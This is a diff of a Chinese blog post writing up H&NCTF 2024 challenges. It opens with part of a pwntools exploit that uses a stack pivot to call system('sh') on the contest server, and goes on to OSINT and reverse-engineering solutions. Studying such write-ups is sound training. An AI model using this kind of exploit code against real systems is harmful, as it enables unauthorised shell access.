= <span class="string">&quot;hnctf.yuanshen.life&quot;</span></span><br><span class="line">PORT = <span class="number">33070</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x2c</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">buf_addr = leak - (<span class="number">0xfff93748</span> - <span class="number">0xfff93710</span>)</span><br><span class="line">success(<span class="string">f&quot;buf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08048639</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line"></span><br><span class="line">payload = p32(read) + p32(vuln) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(<span class="string">b&#x27;sh;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x4</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr</span><br><span class="line">success(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr - (<span class="number">0xffb45f80</span> - <span class="number">0xffb45f4c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(system) + p32(bss) + p32(bss)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>最后得到 flag：</p>
+<p>最后得到flag：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H&amp;NCTF&#123;06b0540d-df19-4b49-9e63-fb7b8b67f8f9&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc:</h1>
-<h2 id="mancraft-娱乐题"><a class="markdownIt-Anchor" href="#mancraft-娱乐题">#</a> ManCraft - 娱乐题:</h2>
-<pre><code>	一个我的世界的服务器，下载1.20.4版本之后进入服务器，根据提示，先绑定队伍的token，之后迅速发育，然后勾引金甲僵尸，也就是劳大，把它勾引到陷阱里杀死，然后就能够拿到一个key，之后用这个key就能拿到flag。
+
+
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h1><h2 id="ManCraft-娱乐题"><a href="#ManCraft-娱乐题" class="headerlink" title="ManCraft - 娱乐题:"></a>ManCraft - 娱乐题:</h2><pre><code>    一个我的世界的服务器，下载1.20.4版本之后进入服务器，根据提示，先绑定队伍的token，之后迅速发育，然后勾引金甲僵尸，也就是劳大，把它勾引到陷阱里杀死，然后就能够拿到一个key，之后用这个key就能拿到flag。
 </code></pre>
 <p><img data-src="https://img-blog.csdnimg.cn/img_convert/cf711c6120000fcbd5528f8372572795.png" alt="Screenshot 2024-05-12 155018.png"><img data-src="https://img-blog.csdnimg.cn/img_convert/6bb03b4ea780a0a6b4dc67a0ebe6dd84.png" alt="Screenshot 2024-05-12 155005.png"></p>
-<h2 id="osint复现"><a class="markdownIt-Anchor" href="#osint复现">#</a> osint（复现）:</h2>
-<p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wbmcvNDA2NTcyMzYvMTcxNTY5NzI1MDA1My1iN2ZkZGE1ZC1kOGFiLTRiMTgtYTc1NS02ZGI1MDBiN2JkZDcucG5nP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ3d3cueXVxdWUuY29tJTJGYXR0YWNobWVudHMlMkZ5dXF1ZSUyRjAlMkYyMDI0JTJGcG5nJTJGNDA2NTcyMzYlMkYxNzE1Njk3MjUwMDUzLWI3ZmRkYTVkLWQ4YWItNGIxOC1hNzU1LTZkYjUwMGI3YmRkNy5wbmclMjIlMkMlMjJuYW1lJTIyJTNBJTIyb25pc3QucG5nJTIyJTJDJTIyc2l6ZSUyMiUzQTIwMTk2MDklMkMlMjJleHQlMjIlM0ElMjJwbmclMjIlMkMlMjJzb3VyY2UlMjIlM0ElMjIlMjIlMkMlMjJzdGF0dXMlMjIlM0ElMjJkb25lJTIyJTJDJTIyZG93bmxvYWQlMjIlM0F0cnVlJTJDJTIydGFza0lkJTIyJTNBJTIydWQzNTY4NGExLWRhNmMtNDRkNS1hMTk2LWI1OGM1NTFhMTYwJTIyJTJDJTIydGFza1R5cGUlMjIlM0ElMjJ1cGxvYWQlMjIlMkMlMjJ0eXBlJTIyJTNBJTIyaW1hZ2UlMkZwbmclMjIlMkMlMjJfX3NwYWNpbmclMjIlM0ElMjJib3RoJTIyJTJDJTIybW9kZSUyMiUzQSUyMnRpdGxlJTIyJTJDJTIyaWQlMjIlM0ElMjJ1MDJiMjFiOWMlMjIlMkMlMjJtYXJnaW4lMjIlM0ElN0IlMjJ0b3AlMjIlM0F0cnVlJTJDJTIyYm90dG9tJTIyJTNBdHJ1ZSU3RCUyQyUyMmNhcmQlMjIlM0ElMjJmaWxlJTIyJTdE">onist.png</span><br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/c34220ecf9f8203e1a39b8eddee930af.png" alt="onist.png"><br>
- 溯源的题，一张图片，光是图片来看，似乎只有两种可能，起飞或者降落，又因为题目要求我们输入目的地，所以，如果是难度不高的话，这儿应该是目的地。<br>
-检查图片属性，发现这张照片最后依次的修改时间是 4 月 23 日下午 3 点多，这张照片很明显是晚上拍摄的，所以，照例来说，这张图应该是在之前的晚上拍摄的，所以，先从 4 月 22 日晚上到 23 日凌晨的航班来看。<br>
-另外，根据机翼上红色的那个红色的图，在网上找到了应该是海南航空的飞机，且左边数字，有个 22，大概推测注册号是 X-22XX，左边的字母，好像是根据国家不同定的，中国的是 B。<br>
-之后，搜索注册号为 B-22，能够知道有几个：<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/04d6e4cf5081298b258bc0551c176f39.png" alt="Screenshot 2024-05-14 230753.png"><br>
- 之后，通过搜索 4 月 22 日晚上到 4 月 23 日凌晨那段时间的海南航空的飞机，大致可以得到航班号为 HU7006。<br>
-拿到了航班之后，通过航班和时间搜索，能搜到起始地和目的地，目的地是海口美兰国际机场。<br>
-最后，感觉运气使然，在机场附近遇到个有点眼熟的路的弧度，抱着试一试的想法，把地址写上去，结果正确了：<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/1e47424f573bfa5881e1c1ca5ccdbc13.png" alt="Screenshot 2024-05-14 231654.png"><br>
- 最后 flag：</p>
+<h2 id="osint（复现）"><a href="#osint（复现）" class="headerlink" title="osint（复现）:"></a>osint（复现）:</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wbmcvNDA2NTcyMzYvMTcxNTY5NzI1MDA1My1iN2ZkZGE1ZC1kOGFiLTRiMTgtYTc1NS02ZGI1MDBiN2JkZDcucG5nP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyOiUyMmh0dHBzOi8vd3d3Lnl1cXVlLmNvbS9hdHRhY2htZW50cy95dXF1ZS8wLzIwMjQvcG5nLzQwNjU3MjM2LzE3MTU2OTcyNTAwNTMtYjdmZGRhNWQtZDhhYi00YjE4LWE3NTUtNmRiNTAwYjdiZGQ3LnBuZyUyMiwlMjJuYW1lJTIyOiUyMm9uaXN0LnBuZyUyMiwlMjJzaXplJTIyOjIwMTk2MDksJTIyZXh0JTIyOiUyMnBuZyUyMiwlMjJzb3VyY2UlMjI6JTIyJTIyLCUyMnN0YXR1cyUyMjolMjJkb25lJTIyLCUyMmRvd25sb2FkJTIyOnRydWUsJTIydGFza0lkJTIyOiUyMnVkMzU2ODRhMS1kYTZjLTQ0ZDUtYTE5Ni1iNThjNTUxYTE2MCUyMiwlMjJ0YXNrVHlwZSUyMjolMjJ1cGxvYWQlMjIsJTIydHlwZSUyMjolMjJpbWFnZS9wbmclMjIsJTIyX19zcGFjaW5nJTIyOiUyMmJvdGglMjIsJTIybW9kZSUyMjolMjJ0aXRsZSUyMiwlMjJpZCUyMjolMjJ1MDJiMjFiOWMlMjIsJTIybWFyZ2luJTIyOiU3QiUyMnRvcCUyMjp0cnVlLCUyMmJvdHRvbSUyMjp0cnVlJTdELCUyMmNhcmQlMjI6JTIyZmlsZSUyMiU3RA==">onist.png</span><br><img data-src="https://img-blog.csdnimg.cn/img_convert/c34220ecf9f8203e1a39b8eddee930af.png" alt="onist.png"><br>溯源的题，一张图片，光是图片来看，似乎只有两种可能，起飞或者降落，又因为题目要求我们输入目的地，所以，如果是难度不高的话，这儿应该是目的地。<br>检查图片属性，发现这张照片最后依次的修改时间是4月23日下午3点多，这张照片很明显是晚上拍摄的，所以，照例来说，这张图应该是在之前的晚上拍摄的，所以，先从4月22日晚上到23日凌晨的航班来看。<br>另外，根据机翼上红色的那个红色的图，在网上找到了应该是海南航空的飞机，且左边数字，有个22，大概推测注册号是X-22XX，左边的字母，好像是根据国家不同定的，中国的是B。<br>之后，搜索注册号为B-22，能够知道有几个：<br><img data-src="https://img-blog.csdnimg.cn/img_convert/04d6e4cf5081298b258bc0551c176f39.png" alt="Screenshot 2024-05-14 230753.png"><br>之后，通过搜索4月22日晚上到4月23日凌晨那段时间的海南航空的飞机，大致可以得到航班号为HU7006。<br>拿到了航班之后，通过航班和时间搜索，能搜到起始地和目的地，目的地是海口美兰国际机场。<br>最后，感觉运气使然，在机场附近遇到个有点眼熟的路的弧度，抱着试一试的想法，把地址写上去，结果正确了：<br><img data-src="https://img-blog.csdnimg.cn/img_convert/1e47424f573bfa5881e1c1ca5ccdbc13.png" alt="Screenshot 2024-05-14 231654.png"><br>最后flag：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H-NCTF&#123;ae53219d0966&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Re</h1>
-<h2 id="最喜欢的逆向题"><a class="markdownIt-Anchor" href="#最喜欢的逆向题">#</a> 最喜欢的逆向题</h2>
-<p>签到题<br>
- v1=a1 [5]=105<br>
-64 位<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/6aecae5c25ab966f7031681129163ad1.png" alt="image.png"><br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/9a680c7b9571f95c95e3387981104837.png" alt="image.png"></p>
-<h2 id="imagepng"><a class="markdownIt-Anchor" href="#imagepng">#</a> <img data-src="https://img-blog.csdnimg.cn/img_convert/126e38404d285530ded60d084a24f164.png" alt="image.png"></h2>
-<h2 id="hnwna"><a class="markdownIt-Anchor" href="#hnwna">#</a> hnwna</h2>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/1e45abae7e7b19ba49bf20024e72dcb7.png" alt="image.png"><br>
- 一个 CSharp 写的小游戏<br>
-方法一：<br>
-用 ILSPY 打开下面的文件<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/e3cd66f1b87fdd0bf564ea75d5a30156.png" alt="image.png"><br>
- 搜索找到关键函数了（一开始搜索区域不对，导致找不到关键函数）<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/47014959c6e7273ea815c97eeb7e218c.png" alt="image.png"></p>
-<p>函数 a 为凯撒，if 判断那里移位为 5<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/1bae176c78c6cdaa6215f186e6a11ef8.png" alt="image.png"><br>
- 加密</p>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/6c27a0a6a4f7087be4e37c1833102ae7.png" alt="image.png"><br>
- 方法二：dnspy，类似于破解</p>
-<h2 id="do-you-know-swddwait"><a class="markdownIt-Anchor" href="#do-you-know-swddwait">#</a> DO YOU KNOW SWDD?（wait）</h2>
-<p>32 位打开 ida，出现 SMC。<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/ed5d966cbed038fecbb66e8ec4e749c6.png" alt="image.png"><br>
- 动态调试<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/e690d825722feb18cba7e78cb45b899c.png" alt="image.png"><br>
- 在导入表中有 virtualprotect 函数，这里对内存权限进行了修改，大概率是 SMC。<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/23f0e00acb661a123f7a56a687cce303.png" alt="image.png"><br>
- 看 41127B 函数 (断点位置下错了，照着 wp 都能错，服了）</p>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/5c2fffc54e63b92ab40b173a92efc026.png" alt="image.png"><br>
- 看 4113D9<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/c71af45348c34fc31f3a6dd8a76c1a42.png" alt="image.png"><br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/1282a4aa673fd5c21742692aaa5e44e1.png" alt="image.png"><br>
-p 然后 f5<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/fadbd50ad886b850ef2f02097879bfc2.png" alt="image.png"><br>
- 可知是凯撒移位 10 位<br>
-<img data-src="https://img-blog.csdnimg.cn/img_convert/0c76881393aa4b6938c1c4e751019f5d.png" alt="image.png"></p>
-<h2 id="childmaze"><a class="markdownIt-Anchor" href="#childmaze">#</a> childmaze</h2>
-<p><img data-src="https://img-blog.csdnimg.cn/img_convert/6b52a1d3bffc480f56e4e4e9438960f9.png" alt="image.png"><br>
- 迷宫问题<br>
-方法一：静态分析<br>
-找到关键数据部分（不易找到），交叉引用</p>
+
+
+
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="最喜欢的逆向题"><a href="#最喜欢的逆向题" class="headerlink" title="最喜欢的逆向题"></a>最喜欢的逆向题</h2><p>签到题<br>v1&#x3D;a1[5]&#x3D;105<br>64位<br><img data-src="https://img-blog.csdnimg.cn/img_convert/6aecae5c25ab966f7031681129163ad1.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/9a680c7b9571f95c95e3387981104837.png" alt="image.png"></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img data-src="https://img-blog.csdnimg.cn/img_convert/126e38404d285530ded60d084a24f164.png" alt="image.png"></h2><h2 id="hnwna"><a href="#hnwna" class="headerlink" title="hnwna"></a>hnwna</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/1e45abae7e7b19ba49bf20024e72dcb7.png" alt="image.png"><br>一个CSharp写的小游戏<br>方法一：<br>用ILSPY打开下面的文件<br><img data-src="https://img-blog.csdnimg.cn/img_convert/e3cd66f1b87fdd0bf564ea75d5a30156.png" alt="image.png"><br>搜索找到关键函数了（一开始搜索区域不对，导致找不到关键函数）<br><img data-src="https://img-blog.csdnimg.cn/img_convert/47014959c6e7273ea815c97eeb7e218c.png" alt="image.png"></p>
+<p>函数a为凯撒，if判断那里移位为5<br><img data-src="https://img-blog.csdnimg.cn/img_convert/1bae176c78c6cdaa6215f186e6a11ef8.png" alt="image.png"><br>加密</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/6c27a0a6a4f7087be4e37c1833102ae7.png" alt="image.png"><br>方法二：dnspy，类似于破解</p>
+<h2 id="DO-YOU-KNOW-SWDD-（wait）"><a href="#DO-YOU-KNOW-SWDD-（wait）" class="headerlink" title="DO YOU KNOW SWDD?（wait）"></a>DO YOU KNOW SWDD?（wait）</h2><p>32位打开ida，出现SMC。<br><img data-src="https://img-blog.csdnimg.cn/img_convert/ed5d966cbed038fecbb66e8ec4e749c6.png" alt="image.png"><br>动态调试<br><img data-src="https://img-blog.csdnimg.cn/img_convert/e690d825722feb18cba7e78cb45b899c.png" alt="image.png"><br>在导入表中有virtualprotect函数，这里对内存权限进行了修改，大概率是SMC。<br><img data-src="https://img-blog.csdnimg.cn/img_convert/23f0e00acb661a123f7a56a687cce303.png" alt="image.png"><br>看41127B函数(断点位置下错了，照着wp都能错，服了）</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/5c2fffc54e63b92ab40b173a92efc026.png" alt="image.png"><br>看4113D9<br><img data-src="https://img-blog.csdnimg.cn/img_convert/c71af45348c34fc31f3a6dd8a76c1a42.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/1282a4aa673fd5c21742692aaa5e44e1.png" alt="image.png"><br>p然后f5<br><img data-src="https://img-blog.csdnimg.cn/img_convert/fadbd50ad886b850ef2f02097879bfc2.png" alt="image.png"><br>可知是凯撒移位10位<br><img data-src="https://img-blog.csdnimg.cn/img_convert/0c76881393aa4b6938c1c4e751019f5d.png" alt="image.png"></p>
+<h2 id="childmaze"><a href="#childmaze" class="headerlink" title="childmaze"></a>childmaze</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/6b52a1d3bffc480f56e4e4e9438960f9.png" alt="image.png"><br>迷宫问题<br>方法一：静态分析<br>找到关键数据部分（不易找到），交叉引用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;H&#x27;L@PC&#125;Ci625`hG2]3bZK4&#123;1~&quot;</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(ord(s[i]) ^ (i % 7)), end=&quot;&quot;)</span><br></pre></td></tr></table></figure>
-<p>方法二：调试<br>
-在判断跳转的时候下个断点修改 zf 标识符或者改为 jnz 都能实现直接输出 flag<br>
-emmIDA 版本问题吧，识别不出 rust。。。。</p>
+<p>方法二：调试<br>在判断跳转的时候下个断点修改zf标识符或者改为jnz都能实现直接输出flag<br>emmIDA 版本问题吧，识别不出rust。。。。</p>
 
       <div class="tags">
           <a href="/tags/Game/" rel="tag"><i class="ic i-tag"></i> Game</a>
@@ -413,7 +352,7 @@ emmIDA 版本问题吧，识别不出 rust。。。。</p>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#please_rce_me"><span class="toc-number">1.1.</span> <span class="toc-text"> Please_RCE_Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_tp%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text"> ez_tp（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezflask%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text"> ezFlask（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E6%83%85%E5%86%B5"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 失败情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%83%85%E5%86%B5"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 成功情况：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text"> Pwn:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#close"><span class="toc-number">2.1.</span> <span class="toc-text"> close</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez_pwn%E5%A4%8D%E7%8E%B0exp%E6%98%AF%E5%A4%A7%E4%BD%AC%E7%9A%84%E6%9C%89%E6%97%B6%E9%97%B4%E8%87%AA%E5%B7%B1%E5%86%8D%E5%86%99%E4%B8%AAexp"><span class="toc-number">2.2.</span> <span class="toc-text"> ez_pwn（复现，exp 是大佬的，有时间自己再写个 exp）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> Misc:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mancraft-%E5%A8%B1%E4%B9%90%E9%A2%98"><span class="toc-number">3.1.</span> <span class="toc-text"> ManCraft - 娱乐题:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.2.</span> <span class="toc-text"> osint（复现）:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">4.</span> <span class="toc-text"> Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text"> 最喜欢的逆向题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#imagepng"><span class="toc-number">4.2.</span> <span class="toc-text"> </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hnwna"><span class="toc-number">4.3.</span> <span class="toc-text"> hnwna</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#do-you-know-swddwait"><span class="toc-number">4.4.</span> <span class="toc-text"> DO YOU KNOW SWDD?（wait）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#childmaze"><span class="toc-number">4.5.</span> <span class="toc-text"> childmaze</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Please-RCE-Me"><span class="toc-number">1.1.</span> <span class="toc-text">Please_RCE_Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-tp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">ez_tp（复现）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezFlask%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">ezFlask（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">失败情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">成功情况：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#close"><span class="toc-number">2.1.</span> <span class="toc-text">close</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pwn%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%8Cexp%E6%98%AF%E5%A4%A7%E4%BD%AC%E7%9A%84%EF%BC%8C%E6%9C%89%E6%97%B6%E9%97%B4%E8%87%AA%E5%B7%B1%E5%86%8D%E5%86%99%E4%B8%AAexp%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">ez_pwn（复现，exp是大佬的，有时间自己再写个exp）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ManCraft-%E5%A8%B1%E4%B9%90%E9%A2%98"><span class="toc-number">3.1.</span> <span class="toc-text">ManCraft - 娱乐题:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">osint（复现）:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-number">4.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">最喜欢的逆向题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hnwna"><span class="toc-number">4.3.</span> <span class="toc-text">hnwna</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DO-YOU-KNOW-SWDD-%EF%BC%88wait%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">DO YOU KNOW SWDD?（wait）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#childmaze"><span class="toc-number">4.5.</span> <span class="toc-text">childmaze</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
@@ -522,30 +461,22 @@ emmIDA 版本问题吧，识别不出 rust。。。。</p>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/2024/03/03/Web/SQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" title="SQL无列名注入">SQL无列名注入</a></span>
+    <span><a href="/2024/02/13/Pwn/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89ret2syscall/" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
 </div>
 
-    <span><a href="/2024/06/06/Game/%E3%80%902024%E3%80%91LitCTF/" title="【2024】LitCTF">【2024】LitCTF</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
-</div>
-
-    <span><a href="/2024/05/21/Daily/%E5%B0%8F%E5%B0%8F%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E6%97%A5%E5%B8%B8%E5%8F%91%E7%99%AB%EF%BC%89/" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
+    <span><a href="/2024/06/15/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-3%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E6%95%B0%E7%BB%84/" title="数据结构-3、栈、队列和数组">数据结构-3、栈、队列和数组</a></span>
   </li>
 
       
@@ -562,20 +493,49 @@ emmIDA 版本问题吧，识别不出 rust。。。。</p>
